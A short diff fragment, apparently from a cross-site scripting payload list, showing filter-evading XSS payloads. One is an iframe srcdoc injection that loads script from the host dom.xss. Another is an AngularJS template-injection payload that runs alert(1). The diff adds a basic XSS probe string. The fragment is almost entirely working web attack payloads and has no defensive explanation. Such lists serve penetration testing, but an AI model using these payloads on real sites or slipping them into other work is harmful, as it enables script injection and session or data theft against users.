@@ -22,3 +22,5 @@ link=qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>
   ````
   {{$eval.constructor('alert(1)')()}}
   ````
+  ---
+ - XSS Basic Payload  ( anything'"<x</   )
